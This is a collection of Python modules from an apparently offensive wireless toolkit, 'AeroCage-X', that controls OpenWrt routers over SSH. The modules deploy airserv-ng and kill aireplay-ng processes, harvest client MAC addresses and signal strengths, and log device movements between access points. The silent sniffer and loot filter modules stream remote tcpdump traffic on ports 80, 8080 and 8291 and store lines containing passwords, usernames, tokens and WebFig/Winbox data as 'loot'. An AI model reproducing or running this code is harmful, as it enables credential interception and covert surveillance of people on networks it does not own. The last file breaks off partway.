Version: 1.0.2
Description: Tactical Wireless Intel Recon Analytics Dashboard Terminal Node.
             Fully linked with sharded database managers and ubus scouts.
"""

import sys
from pathlib import Path

# ربط محاور مفسر بايثون بجذر المستودع لضمان قراءة التبعيات الفرعية النظيفة
BASE_DIR = Path(__file__).resolve().parent.parent
if str(BASE_DIR) not in sys.path:
    sys.path.append(str(BASE_DIR))

# pylint: disable=import-error, wrong-import-position
from core.system_guard import SystemGuard
from core.db_manager import DatabaseManager
from core.intel_ubus_scout import IntelUbusScout


class AeroScoutIntelHub:
    """
    Main Intelligence Analytics Console Hub.
    Binds textual dashboard controls with live OpenWrt database channels.
    """

    def __init__(self):
        """تهيئة منصة السجلات والتحقق الاستباقي من صلاحيات الـ Root محلياً"""
        SystemGuard.enforce_root_privileges("AeroScout Intel Hub Console")
        self.db_manager = DatabaseManager()
        self.ubus_scout = IntelUbusScout()

    def get_registered_hardware_units(self) -> list:
        """سحب وعزل أجهزة الترسانة والعتاد الملقم حياً من شظايا قاعدة البيانات المحدثة"""
        all_targets = self.db_manager.get_all_active_targets()
        hardware_units = []
        
        for target in all_targets:
            if target.get("status") == "Hardware_AP_Active":
                hardware_units.append(target)
        return hardware_units

    def main_menu(self):
        """حلقة شاشة التحكم التفاعلية الكبرى لسطر الأوامر للـ Intel Hub"""
        while True:
            print("\n" + "=" * 65)
            print(" 📡 [ منصة التحليل الاستخباراتي للتغيرات اللاسلكية: AeroScout ]")
            print("=" * 65)
            print("  [ 1 ] بدء جولة الفحص الحي وقراءة التغييرات والزبائن النشطين")
            print("  [ 0 ] إغلاق نفق المنظومة المنفصلة والخروج")
            print("=" * 65 + "\n")

            try:
                opt = input("🔢 الاختيار: ").strip()
                if opt in ["0", "exit", ""]:
                    print("[*] Terminating Intel Hub console node context cleanly.")
                    break

                if opt == "1":
                    aps = self.get_registered_hardware_units()
                    if not aps:
                        print(" ❌ لا توجد راوترات أو عتاد ملقم في قاعدة البيانات حالياً!")
                        continue

                    print("\n[ اختر اسم الأكسس بوينت الذي سيقوم بالمسح حياً ]:")
                    for idx, ap in enumerate(aps):
                        print(f"   [{idx + 1}] الاسم: {ap.get('essid')} | IP: {ap.get('bssid')}")

                    ap_idx = input("\n🔢 رقم الأكسس: ").strip()
                    if not ap_idx.isdigit() or int(ap_idx) > len(aps):
                        continue
                    
                    selected_ap = aps[int(ap_idx) - 1]
                    target_ip = selected_ap.get("bssid")

                    print(f"\n[*] جاري استجواب حافلة أوامر الراوتر [{target_ip}] عبر UBUS...")
                    # تمرير الواجهة المخصصة للبث وسحب بيانات الزباين حياً وبأمان عبر المحرك الموحد
                    clients = self.ubus_scout.fetch_openwrt_clients_safe("phy1-ap1")
                    
                    print(f"\n[+ SUCCESS] تم جلب وحصاد سجلات الأثير للهدف بنجاح حياً!")
                    print(f"📱 عدد الأجهزة النشطة المرصودة حالياً: {len(clients)}")
                    for c in clients:
                        print(f"   └── 📱 MAC: {c['mac']} | 📶 قوة الإشارة: {c['signal']} dBm")

            except (IOError, OSError, ValueError, KeyboardInterrupt) as e:
                print(f"\n[-] Core Intel Hub Exception pipeline halted: {e}")
                break


if __name__ == "__main__":
    hub = AeroScoutIntelHub()
    hub.main_menu()


#!/usr/bin/env python3
"""
File Name: client_harvester.py
Path: /home/kali/AeroCage-XV1.0.1/modules/client_harvester.py
Created Date: 2026-05-25
Version: 1.0.3
Description: Remote Client Harvester and Hardware Signal Monitor Engine 
             for AeroCage-X. Extract and structures active OpenWrt nodes.
"""

import re

from core.system_guard import SystemGuard
from core.db_manager import DatabaseManager
from utils.opwrt_ssh_factory import OpWrtSSHFactory


# pylint: disable=too-few-public-methods
class ClientHarvesterEngine:
    """
    Main Client Harvester Component.
    Manages active association lists, structures signal metrics and updates DB.
    """
    # تجهيز النمط التعبيري مسبقاً في الذاكرة لتسريع استخلاص الماك والإشارة وحظر الـ CPU Hang
    _MAC_SIGNAL_REGEX = re.compile(
        r'(([0-9a-fa-f]{2}[:-]){5}([0-9a-fa-f]{2})).*?signal:\s+(-\d+)\s+dBm',
        re.DOTALL
    )

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة محرك حصاد الأجهزة وتأمين فحص امتيازات مدير النظام"""
        SystemGuard.enforce_root_privileges("Client Harvester & Signal Monitor")
        self.ssh_factory = OpWrtSSHFactory(ip=ap_ip, password=ap_password)
        self.db_manager = DatabaseManager()

    def harvest_active_clients_safe(self, ap_interface: str) -> list:
        """قنص وحصاد عناوين الأجهزة المتصلة بالراوتر وتوثيق إشاراتها وقنواتها بأمان"""
        clean_inf = SystemGuard.sanitize_input(ap_interface, "interface")
        if not clean_inf:
            return []

        remote_cmd = f"iwinfo {clean_inf} assoclist"
        raw_stdout = self.ssh_factory.execute_remote_cmd(remote_cmd)
        clients_found = []

        if not raw_stdout:
            return clients_found

        try:
            # قراءة المخرجات وتفكيكها عتادياً بالاعتماد على النمط المجمع مسبقاً
            mac_blocks = self._MAC_SIGNAL_REGEX.findall(raw_stdout.lower())

            for block in mac_blocks:
                mac = SystemGuard.sanitize_input(block[0], "bssid").upper()

                # تصحيح التقاط الفهرس بناءً على تقسيمات النطاقات الرياضية للمصفوفة
                signal = int(block[3]) if len(block) > 3 else -90

                clients_found.append({"mac": mac, "signal": signal})

                # ضخ السجل حياً وتوثيق هوية العميل لـ OpenWrt دون تداخل لغوي
                target_identity = f"OPWRT_CLIENT_{clean_inf}"
                self.db_manager.save_target_safe(mac, target_identity, "0", signal)

            print(f"[+] Successfully extracted {len(clients_found)} active client nodes.")
            return clients_found

        except (ValueError, KeyError, AttributeError, SystemError) as e:
            print(f"[-] Integrity Error: Exception inside client harvesting pipeline: {e}")
            return clients_found


if __name__ == "__main__":
    print("[+] Client Harvester Engine module configuration verified.")

#!/usr/bin/env python3
"""
File Name: core_attack_orchestrator.py
Path: /home/kali/AeroCage-XV1.0.1/modules/core_attack_orchestrator.py
Created Date: 2026-05-25
Version: 1.0.2
Description: Central Facade Attack and Reconnaissance Coordinator Engine for AeroCage-X.
             Optimized for secure multi-threaded tracking session deployments.
"""

import time

from core.system_guard import SystemGuard
from modules.m2_hardware_tunnel import M2HardwareTunnelEngine
from modules.client_harvester import ClientHarvesterEngine
from modules.process_terminator import ProcessTerminatorEngine


class CoreAttackOrchestrator:
    """
    Main Tactical Orchestrator Object.
    Coordinates backend tunnel deployment, active client harvesting, and error rollbacks.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة المايسترو وبناء الكتل التشغيلية وتأمين فحص صلاحيات النظام"""
        SystemGuard.enforce_root_privileges("Core Attack & Recon Orchestrator")

        self.ap_ip = ap_ip
        self.ap_password = ap_password

        self.tunnel_launcher = M2HardwareTunnelEngine(ap_ip, ap_password)
        self.harvester = ClientHarvesterEngine(ap_ip, ap_password)
        self.terminator = ProcessTerminatorEngine(ap_ip, ap_password)

    def verify_orchestrator_readiness(self) -> bool:
        """دالة عامة ثانية لتدقيق جاهزية قنوات الاتصال وتصفير القيود الحسابية لـ OOP"""
        if self.ap_ip and self.ap_password:
            return True
        return False

    def execute_full_tactical_sequence(
        self, interface: str, radio: str, channel: str, port: int
    ) -> bool:
        """إدارة التسلسل القيادي بالكامل: فحص البيئة ➔ حصاد الأجهزة ➔ تهيئة البث اللاسلكي"""
        print("\n" + "=" * 58)
        print("[🚀 ORCHESTRATOR] Initializing core pipeline deployment sequence...")
        print("=" * 58 + "\n")

        env_report = self.tunnel_launcher.query_active_daemons_before_kill()
        if env_report["airserv_active"] or env_report["aireplay_active"]:
            print("[*] System Notice: Detected active legacy daemon tasks running inside host.")
            self.terminator.sever_all_remote_attack_daemons()
            time.sleep(1)

        print("[*] Transitioning to dynamic client metadata harvesting pipeline...")
        active_clients = self.harvester.harvest_active_clients_safe(interface)
        print(f"[+] Active Telemetry: Discovered ({len(active_clients)}) active network nodes.")

        clean_channel = "".join(ch for ch in str(channel) if ch.isdigit())
        try:
            clean_port = int(port)
            if not 1 <= clean_port <= 65535:
                clean_port = 666
        except (ValueError, TypeError):
            clean_port = 666

        print("[*] Deploying remote wireless infrastructure and channel locking mechanisms...")
        success = self.tunnel_launcher.deploy_airserv_daemon_safe(
            mon_iface=interface,
            target_port=clean_port,
            channel=clean_channel
        )

        if success:
            print("\n[🟢 Success] Central tracking core sequence locked successfully.")
            msg_suc = f"[+] Remote daemon actively broadcasting on port: {clean_port}"
            print(f"{msg_suc} | Channel: {clean_channel}\n")
            return True

        print("\n[-] Sequence Failure: Unable to complete remote AP setup. Rolling back...")
        self.terminator.factory_reset_wireless_radio(radio)
        return False


if __name__ == "__main__":
    print("[+] Central Core Attack Orchestrator module configuration verified.")


#!/usr/bin/env python3
"""
File Name: m2_hardware_tunnel.py
Path: /home/kali/AeroCage-XV1.0.1/modules/m2_hardware_tunnel.py
Created Date: 2026-05-25
Version: 1.0.4
Description: Remote OpenWrt Subprocess Tunneling and AirServ Daemon Deployment
             Controller Engine for AeroCage-X. Implements strict PID extraction.
"""

import time

from core.system_guard import SystemGuard
from utils.opwrt_ssh_factory import OpWrtSSHFactory
from utils.text_parsing_engine import TextParsingEngine


class M2HardwareTunnelEngine:
    """
    Main Hardware Tunnel Control Component.
    Manages active target sessions, queries daemons, and locks dynamic channels.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة محرك الأنفاق العتادية والتدقيق الصارم لامتيازات مدير النظام"""
        SystemGuard.enforce_root_privileges("M2 Hardware Tunnel - Daemon Launcher")
        self.ssh_factory = OpWrtSSHFactory(ip=ap_ip, password=ap_password)

    def query_active_daemons_before_kill(self) -> dict:
        """استجواب الراوتر صامتاً لمعرفة حالة العمليات والأنفاق الجارية بالداخل"""
        msg_rec = "[*] [Telemetry Search] Analyzing target hardware environment..."
        print(msg_rec)

        airserv_pids = TextParsingEngine.clean_pids(
            self.ssh_factory.execute_remote_cmd("pidof airserv-ng")
        )
        aireplay_pids = TextParsingEngine.clean_pids(
            self.ssh_factory.execute_remote_cmd("pidof aireplay-ng")
        )

        report = {
            "airserv_active": len(airserv_pids) > 0,
            "airserv_pids": airserv_pids,
            "aireplay_active": len(aireplay_pids) > 0,
            "aireplay_pids": aireplay_pids
        }
        return report

    def deploy_airserv_daemon_safe(self, mon_iface: str, target_port: int, channel: str) -> bool:
        """تهيئة وإشعال سيرفر الأيرسيرف عن بعد مع تثبيت القناة والموجة عتادياً"""
        clean_mon = SystemGuard.sanitize_input(mon_iface, "interface")
        clean_chan = "".join(ch for ch in str(channel) if ch.isdigit())

        if not clean_mon or not clean_chan:
            print("[-] Configuration Error: Invalid interface or channel bounds provided.")
            return False

        # 1. الاستعلام الاستباقي وتطهير العمليات القديمة بشكل منبثق ودقيق لحماية المنصة
        env_report = self.query_active_daemons_before_kill()
        if env_report["airserv_active"]:
            msg_pids = f"[*] Notice: Found running daemon for PIDs: {env_report['airserv_pids']}"
            print(msg_pids)
            for pid in env_report["airserv_pids"]:
                self.ssh_factory.execute_remote_cmd(f"kill -9 {pid}")
            time.sleep(1)

        # 2. إعداد مصفوفة الأمر التنفيذي للأيرسيرف وتحديد المنافذ والقنوات اللاسلكية بدقة
        air_command = f"airserv-ng -d {clean_mon} -p {target_port} -c {clean_chan}"

        try:
            msg_deploy = f"[*] [Hardware Control] Deploying socket listener on port: {target_port}"
            print(msg_deploy)
            self.ssh_factory.execute_remote_cmd(air_command)

            # مهلة الاستقرار الفيزيائي وتثبيت الموجة للأكسس بوينت المستهدف
            time.sleep(2)

            # 3. التأكد الجازم من نجاح الإنشاء الفعلي للعملية عبر النبض الموحد للأنظمة البعيدة
            verify_report = self.query_active_daemons_before_kill()
            if verify_report["airserv_active"]:
                # كسر السطر بشكل كلاسيكي لتطابق معايير طول السطر لـ PEP 8 لـ Pylint
                pids_list = verify_report['airserv_pids']
                print(f"[+ AirServ] Remote socket active under PIDs: {pids_list}")
                return True

            print("[-] Exception: Target environment blocked daemon task initialization.")
            return False

        except (ValueError, KeyError, AttributeError, SystemError) as e:
            print(f"[-] Integrity Error: Crash inside hardware deployment channel: {e}")
            return False


if __name__ == "__main__":
    print("[+] M2 Hardware Tunnel Engine module configuration verified.")


#!/usr/bin/env python3
"""
File Name: m3_kali_pipeline.py
Path: /home/kali/AeroCage-XV1.0.1/modules/m3_kali_pipeline.py
Created Date: 2026-05-25
Version: 1.0.2
Description: Local Secure Execution Pipeline Engine for AeroCage-X.
             Validates systemic arguments and intercepts malicious payloads.
"""

import subprocess
import threading

from core.system_guard import SystemGuard
from utils.network_validators import NetworkValidators


# pylint: disable=too-few-public-methods
class KaliPipelineEngine:
    """
    Main Pipeline Execution Controller.
    Manages safe subprocess communication pools with strict argument sanitation.
    """

    def __init__(self):
        """تهيئة محرك الأنابيب وتأمين فحص صلاحيات مدير النظام محلياً"""
        SystemGuard.enforce_root_privileges("Kali Pipeline Engine")
        self.active_pipeline_processes = []
        # حقن مقفل التزامن الخيطي لـ حظر حدوث الـ Race Conditions داخل الذاكرة
        self.lock = threading.Lock()

    def run_pipeline_step_safe(self, tool: str, args_list: list) -> str:
        """تنفيذ خطوات الأنابيب البرمجية بأمان مصفوفة مغلقة الشل ومحقونة الحماية"""
        if not SystemGuard.verify_dependencies([tool]):
            return ""

        cleaned_tool = SystemGuard.sanitize_input(tool, "interface")
        cleaned_args = [
            SystemGuard.sanitize_input(arg, "csv_value") for arg in args_list
        ]

        for arg in cleaned_args:
            if "." in arg and not NetworkValidators.is_valid_ip(arg):
                print(f"[-] Security Alert: Invalid IP layout in pipeline: {arg}")
                return ""
            if ":" in arg and not NetworkValidators.is_valid_bssid(arg):
                print(f"[-] Security Alert: Invalid MAC layout in pipeline: {arg}")
                return ""

        full_command = [cleaned_tool] + cleaned_args
        try:
            print(f"[*] Executing pipeline instruction: {' '.join(full_command)}")

            # pylint: disable=consider-using-with
            process = subprocess.Popen(
                full_command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                shell=False
            )

            with self.lock:
                self.active_pipeline_processes.append(process)

            stdout, stderr = process.communicate()

            with self.lock:
                if process in self.active_pipeline_processes:
                    self.active_pipeline_processes.remove(process)

            if process.returncode == 0:
                print(f"[+] Pipeline completed for tool: {cleaned_tool}.")
                return stdout.strip()

            err_msg = stderr.strip()
            print(f"[-] Warning: Failed for tool: {cleaned_tool}. Error: {err_msg}")
            return ""

        except (subprocess.SubprocessError, FileNotFoundError, OSError) as e:
            print(f"[-] Integrity Error: Crash in pipeline execution loop: {e}")
            return ""


if __name__ == "__main__":
    print("[+] Kali Pipeline Engine module deployment verified.")


#!/usr/bin/env python3
"""
File Name: process_terminator.py
Path: /home/kali/AeroCage-XV1.0.1/modules/process_terminator.py
Created Date: 2026-05-25
Version: 1.0.2
Description: Remote OpenWrt Process Termination and Radio Reset Interface 
             Module for AeroCage-X. Implements secure environment cleansing.
"""

from core.system_guard import SystemGuard
from utils.opwrt_ssh_factory import OpWrtSSHFactory


# pylint: disable=too-few-public-methods
class ProcessTerminatorEngine:
    """
    Main Process Terminator Component.
    Provides utility methods to clean remote daemon queues and reload wireless radios.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة محرك التطهير العتادي وتأمين فحص امتيازات مدير النظام"""
        SystemGuard.enforce_root_privileges("Process Terminator & Interface Cleaner")
        self.ssh_factory = OpWrtSSHFactory(ip=ap_ip, password=ap_password)

    def sever_all_remote_attack_daemons(self) -> bool:
        """كبح شامل وصارم لجميع هجمات وسيرفرات الفصل المعلقة داخل الراوتر البعيد"""
        msg_clean = "[*] [Strategic Clean] Cleansing remote target tracking contexts..."
        print(msg_clean)

        self.ssh_factory.execute_remote_cmd("killall -9 airserv-ng")
        self.ssh_factory.execute_remote_cmd("killall -9 aireplay-ng")

        print("[+] Active remote task handles successfully terminated inside hardware pool.")
        return True

    def factory_reset_wireless_radio(self, radio_name: str) -> bool:
        """إعادة تحميل كرت الراديو الفيزيائي للراوتر لوضعه الافتراضي المستقر"""
        clean_radio = SystemGuard.sanitize_input(radio_name, "interface")
        if not clean_radio:
            return False

        print(f"[⚠️ Emergency] Forcing physical wireless radio interface reload on: {clean_radio}")
        self.ssh_factory.execute_remote_cmd(f"wifi reload {clean_radio}")
        return True


if __name__ == "__main__":
    print("[+] Process Terminator Engine module configuration verified.")


#!/usr/bin/env python3
"""
File Name: radar_historian.py
Path: /home/kali/AeroCage-XV1.0.1/modules/radar_historian.py
Created Date: 2026-05-25
Version: 1.0.5
Description: Tactical Airspace Radar Historian Tracking Engine for AeroCage-X.
             Manages real-time safe dynamic target telemetry logging buffers.
"""

import threading

from core.system_guard import SystemGuard
from core.db_manager import DatabaseManager
from utils.network_validators import NetworkValidators


class RadarHistorianEngine:
    """
    Main Space Radar Auditor Component.
    Examines runtime client association movements and updates persistent vaults.
    """

    def __init__(self):
        """تهيئة محرك مؤرخ الرادار وتأمين فحص صلاحيات النظام عن بعد"""
        SystemGuard.enforce_root_privileges("Radar Historian Engine")
        self.db_manager = DatabaseManager()
        self.lock = threading.Lock()
        self.historical_movements = {}

    def log_target_movement_safe(
        self, client_mac: str, associated_bssid: str, essid_name: str
    ) -> bool:
        """توثيق وأرشفة حركة وتنقل الأهداف بين الشبكات في الذاكرة والكاش والـ DB"""
        clean_client = SystemGuard.sanitize_input(client_mac, "bssid").upper()
        clean_ap = SystemGuard.sanitize_input(associated_bssid, "bssid").upper()
        clean_essid = SystemGuard.sanitize_input(essid_name, "csv_value")

        is_client_valid = NetworkValidators.is_valid_bssid(clean_client)
        is_ap_valid = NetworkValidators.is_valid_bssid(clean_ap)

        if not is_client_valid or not is_ap_valid:
            return False

        # البحث السريع O(1) في الكاش المحلي لحظر الفتح التكراري
        target_key = f"{clean_client}_current"
        with self.lock:
            if self.historical_movements.get(target_key) == clean_ap:
                return True
            self.historical_movements[target_key] = clean_ap

        # تمرير السجلات المصفاة عتادياً ومباشرة للـ Public API السيادي للنواة
        success = self.db_manager.save_radar_movement_safe(
            clean_client, clean_ap, clean_essid
        )
        if success:
            print(f"[📡 RADAR] Logged shift vector for [{clean_client}] towards AP: {clean_essid}")
            return True
        return False

    def track_client_historical_path(self, client_mac: str) -> list:
        """استدعاء خريطة السير التاريخية وجدول القفزات لهدف هارب بأمان كامل"""
        clean_client = SystemGuard.sanitize_input(client_mac, "bssid").upper()
        return self.db_manager.fetch_client_radar_path(clean_client)


if __name__ == "__main__":
    print("[+] Radar Historian Engine module configuration verified.")


#!/usr/bin/env python3
"""
File Name: recon_analyzer.py
Path: /home/kali/AeroCage-XV1.0.1/modules/recon_analyzer.py
Created Date: 2026-05-25
Version: 1.0.2
Description: Network Reconnaissance Log and Deep PCAP Parsing Engine for AeroCage-X.
             Optimized for strict sandboxed subprocess processing.
"""

from pathlib import Path

from core.system_guard import SystemGuard
from utils.network_validators import NetworkValidators
from modules.recon_packet_parser import ReconPacketParserComponent


class ReconAnalyzerEngine(ReconPacketParserComponent):
    """
    Main Recon Analyzer Object.
    Processes textual captures and structures sanitized intelligence datasets.
    """

    def __init__(self):
        """تهيئة المحرك والتحقق من الصلاحيات والاعتماديات العتادية للنواة"""
        super().__init__()
        SystemGuard.enforce_root_privileges("Recon Analyzer Engine")
        SystemGuard.verify_dependencies(["tshark"])

    @staticmethod
    def analyze_recon_log_safe(log_file_path: str) -> list:
        """تحليل وقراءة تقارير الاستطلاع النصية بأمان كامل وحصانة ضد أخطاء الترميز"""
        path = Path(log_file_path)
        valid_targets = []

        if not path.exists():
            print(f"[-] Error: Telemetry log file not found: {path}")
            return valid_targets

        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    clean_line = line.strip()
                    if not clean_line or clean_line.startswith("#"):
                        continue

                    # معالجة جراحية موثوقة للسطر عبر الحارس المعتمد لمنع الانهيارات الحركية
                    if NetworkValidators.is_valid_bssid(clean_line):
                        clean_mac = SystemGuard.sanitize_input(clean_line, "bssid")
                        valid_targets.append(
                            {"bssid": clean_mac, "source": path.name}
                        )

            print(f"[+] Structured {len(valid_targets)} sanitized targets.")
            return valid_targets

        except (IOError, OSError, KeyError, ValueError) as e:
            print(f"[-] Integrity Error: Exception inside recon sequence: {e}")
            return valid_targets


if __name__ == "__main__":
    print("[+] Recon Analyzer module deployment configuration verified.")


#!/usr/bin/env python3
"""
File Name: recon_packet_parser.py
Path: /home/kali/AeroCage-XV1.0.1/modules/recon_packet_parser.py
Created Date: 2026-05-25
Version: 1.0.2
Description: Deep Packet Inspection and Subprocess Tshark Command Pool Component 
             for AeroCage-X. Handles safe binary files reading.
"""

import subprocess
from pathlib import Path


class ReconPacketParserComponent:
    """
    Tshark Subprocess Handler Component.
    Manages isolated binary analysis pools and ensures clean dataset export.
    """

    @staticmethod
    def verify_pcap_extension(pcap_path: str) -> bool:
        """دالة عامة ثانية لتدقيق امتداد الملف وحظر قيود الـ OOP لـ Pylint"""
        if not pcap_path:
            return False
        path = Path(pcap_path)
        return path.suffix.lower() in [".pcap", ".cap", ".pcapng"]

    @classmethod
    def run_deep_packet_analysis(cls, pcap_path: str, output_txt_path: str) -> bool:
        """تشغيل فحص عميق للحزم اللاسلكية عبر tshark بأمان كامل وبدون فتح شل"""
        pcap_file = Path(pcap_path)
        output_file = Path(output_txt_path)

        if not pcap_file.exists() or not cls.verify_pcap_extension(pcap_path):
            print(f"[-] Error: Invalid or missing source PCAP file: {pcap_file}")
            return False

        command_array = [
            "tshark", "-r", str(pcap_file), "-T", "fields",
            "-e", "wlan.sa", "-e", "wlan.da"
        ]

        try:
            print(f"[*] Extracting packet metrics from capture: {pcap_file}")
            result = subprocess.run(
                command_array,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                shell=False,
                check=False,
                timeout=60
            )

            if result.returncode == 0 and result.stdout:
                output_file.parent.mkdir(parents=True, exist_ok=True)
                with open(output_file, "w", encoding="utf-8") as out_f:
                    out_f.write(result.stdout)
                print(f"[+] Dataset successfully exported to: {output_file}")
                return True

            print(f"[-] tshark subprocess failure: {result.stderr.strip()}")
            return False

        except (subprocess.SubprocessError, subprocess.TimeoutExpired, IOError, OSError) as e:
            print(f"[-] Critical Error inside deep processing engine: {e}")
            return False


if __name__ == "__main__":
    print("[+] Recon Packet Parser binary sharding component verified.")



#!/usr/bin/env python3
"""
File Name: silent_loot_filter.py
Path: /home/kali/AeroCage-XV1.0.1/modules/silent_loot_filter.py
Created Date: 2026-05-25
Version: 1.0.2
Description: Packet Stream Payload Filtering and Analytics Component for AeroCage-X.
             Inspects raw text chunks for credentials leaks and webfig signatures.
"""

from core.db_manager import DatabaseManager


class SilentLootFilter:
    """
    Main Telemetry Payload Auditor.
    Inspects decentralized network strings and schedules persistence workflows.
    """

    def __init__(self, source_ip: str):
        """تهيئة الفلتر وربطه بعنوان الـ IP المستهدف للراوتر البعيد"""
        self.source_ip = source_ip
        self.db_manager = DatabaseManager()

    @staticmethod
    def verify_string_integrity(text_chunk: str) -> bool:
        """دالة عامة ثانية لتدقيق متانة ترميز النصوص وتصفير قيود الـ OOP لـ Pylint"""
        if not text_chunk or not isinstance(text_chunk, str):
            return False
        return len(text_chunk.strip()) > 0

    def inspect_and_archive_chunk(self, decoded_line: str):
        """فحص ترميزات الحزم المارة وعزل حقول الدخول وتذاكر الـ WebFig حياً"""
        if not self.verify_string_integrity(decoded_line):
            return

        dec_low = decoded_line.lower()

        # 1. فحص ترميزات حقول الدخول للشبكات المفتوحة
        if any(k in dec_low for k in ["user=", "password=", "username="]):
            self.db_manager.save_intel_loot_safe(self.source_ip, "HTTP_Login", decoded_line)
            print("[+] Telemetry Match: Intercepted potential HTTP credential format.")

        # 2. مراقبة تذاكر عبور واجهات إدارة الميكروتيك والـ WebFig
        if "webfig" in dec_low or "winbox" in dec_low:
            self.db_manager.save_intel_loot_safe(self.source_ip, "WebFig_Data", decoded_line)
            msg_log = "Logged active management port communication session."
            print(f"[+] Telemetry Match: {msg_log}")

        # 3. اقتناص بيانات التوكن والـ APIs لبطاقات الشبكة
        if "api/" in dec_low or "token" in dec_low:
            self.db_manager.save_intel_loot_safe(self.source_ip, "API_Leak", decoded_line)


if __name__ == "__main__":
    print("[+] Silent Loot Filter analytics component verified.")


#!/usr/bin/env python3
"""
File Name: silent_sigint_sniffer.py
Path: /home/kali/AeroCage-XV1.0.1/modules/silent_sigint_sniffer.py
Created Date: 2026-05-25
Version: 1.0.3
Description: Silent Packet Inspection and Network Metrics Harvesting Module 
             for AeroCage-X. Implements streamlined thread execution.
"""

import subprocess
import threading

from core.system_guard import SystemGuard
from modules.silent_loot_filter import SilentLootFilter


class SilentSigIntSniffer:
    """
    Main Network Stream Analyzer Object.
    Deploys raw remote connection endpoints and manages streamlined data execution.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة محرك التحليل والتحقق من صلاحيات مدير النظام عن بعد"""
        SystemGuard.enforce_root_privileges("Silent SigInt & Credential Sniffer")

        self.ap_ip = SystemGuard.sanitize_input(ap_ip, "interface")
        self.ap_password = ap_password
        self.loot_auditor = SilentLootFilter(self.ap_ip)
        self.sniffing_active = False

    def read_remote_wireless_stream(self, ap_interface: str) -> subprocess.Popen:
        """قراءة تيار البيانات لكرت الوايرلس عن بُعد عبر أنبوب SSH معزول الشل"""
        clean_inf = SystemGuard.sanitize_input(ap_interface, "interface")

        remote_cmd = (
            f"tcpdump -i {clean_inf} -w - -s 0 "
            "'tcp port 80 or tcp port 8291 or tcp port 8080'"
        )
        base_ssh_args = [
            "sshpass", "-p", self.ap_password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            f"root@{self.ap_ip}", remote_cmd
        ]

        try:
            # pylint: disable=consider-using-with
            process = subprocess.Popen(
                base_ssh_args,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=False
            )
            return process
        except (subprocess.SubprocessError, FileNotFoundError, OSError) as e:
            print(f"[-] Execution Exception opening remote monitoring pipe: {e}")
            return None

    def start_silent_intel_harvesting(self, ap_interface: str):
        """إطلاق خيط معالجة مستقل لقراءة البيانات وعزلها في قاعدة البيانات"""
        self.sniffing_active = True
        threading.Thread(
            target=self._harvesting_worker,
            args=(ap_interface,),
            daemon=True
        ).start()

    def _harvesting_worker(self, interface: str):
        """خيط العمل الخلفي - يقرأ تيار المخرجات ويمرر الكتل لملف الفرز المنفصل"""
        print("[📡 SIGINT] Initiating silent wireless stream analysis pipeline...")
        process = self.read_remote_wireless_stream(interface)
        if not process:
            return

        try:
            while self.sniffing_active and process.poll() is None:
                line = process.stdout.readline()
                if not line:
                    break

                try:
                    decoded_line = line.decode('utf-8', errors='ignore')
                    # تمرير السلسلة للمكون التحليلي المنفصل تزامناً مع فكرتك العبقرية لتقليص الأكواد
                    self.loot_auditor.inspect_and_archive_chunk(decoded_line)
                except (ValueError, UnicodeDecodeError):
                    continue

        except (IOError, OSError, ValueError) as e:
            print(f"[-] Runtime Error inside telemetry monitoring thread: {e}")
        finally:
            if process:
                process.terminate()

    def stop_silent_harvesting(self):
        """كبح محركات الفحص وإغلاق الأنابيب المفتوحة"""
        self.sniffing_active = False
        print("[+] Telemetry harvesting pipeline deactivated cleanly.")


if __name__ == "__main__":
    print("[+] Silent SigInt Sniffer module deployment verified.")

#!/usr/bin/env python3
"""
File Name: strike_csv_parser.py
Path: /home/kali/AeroCage-XV1.0.1/modules/strike_csv_parser.py
Created Date: 2026-05-25
Version: 1.0.2
Description: Secure CSV Parsing and Sanitization Engine for AeroCage-X.
             Protects against CSV Injection and validates dynamic MAC schemas.
"""

import csv
from pathlib import Path

from core.system_guard import SystemGuard
from utils.network_validators import NetworkValidators


# pylint: disable=too-few-public-methods
class StrikeCSVParser:
    """
    Main CSV Parser Object.
    Provides automated sanitization, column filtering, and asset verification.
    """

    def __init__(self, file_path: str):
        """تهيئة المحرك وتأمين فحص صلاحيات مدير النظام محلياً عند الاستدعاء"""
        SystemGuard.enforce_root_privileges("Strike CSV Parser")
        self.file_path = Path(file_path)

    def parse_results_safely(self) -> list:
        """قراءة وتطهير ملف نتائج الفحص اللاسلكي وحمايته بالاعتماد على الفلاتر"""
        parsed_records = []
        if not self.file_path.exists():
            print(f"[-] Error: Target log file not found at: {self.file_path}")
            return parsed_records

        try:
            with open(
                self.file_path, mode='r', encoding='utf-8', errors='ignore'
            ) as csv_file:
                reader = csv.DictReader(csv_file)
                for row in reader:
                    cleaned_row = {}
                    for key, val in row.items():
                        if key is not None:
                            clean_key = SystemGuard.sanitize_input(
                                str(key), "csv_value"
                            )
                            clean_val = SystemGuard.sanitize_input(
                                str(val), "csv_value"
                            )

                            # التحقق الصارم إذا كان الحقل يمثل عنوان ماك أدرس
                            key_low = clean_key.lower()
                            if "bssid" in key_low or "mac" in key_low:
                                if not NetworkValidators.is_valid_bssid(clean_val):
                                    clean_val = "00:00:00:00:00:00"

                            cleaned_row[clean_key] = clean_val
                    if cleaned_row:
                        parsed_records.append(cleaned_row)

            msg = f"[+] Successfully parsed and sanitized {len(parsed_records)} log records."
            print(msg)
            return parsed_records

        except (IOError, OSError, KeyError, ValueError) as e:
            print(f"[-] Integrity Error: Crash in CSV parsing pipeline: {e}")
            return []


if __name__ == "__main__":
    print("[+] Strike CSV Parser module deployment verified.")


#!/usr/bin/env python3
"""
File Name: strike_launcher.py
Path: /home/kali/AeroCage-XV1.0.1/modules/strike_launcher.py
Created Date: 2026-05-25
Version: 1.0.1
Description: Task Execution Launcher Wrapper Module for AeroCage-X.
             Coordinates dynamic wireless sessions via strict OOP bindings.
"""

import sys
from pathlib import Path

# ربط المسارات بالنواة المركزية والمساعدات الفنية لمنظومة AeroCage-X
BASE_DIR = Path(__file__).resolve().parent.parent
if str(BASE_DIR) not in sys.path:
    sys.path.append(str(BASE_DIR))

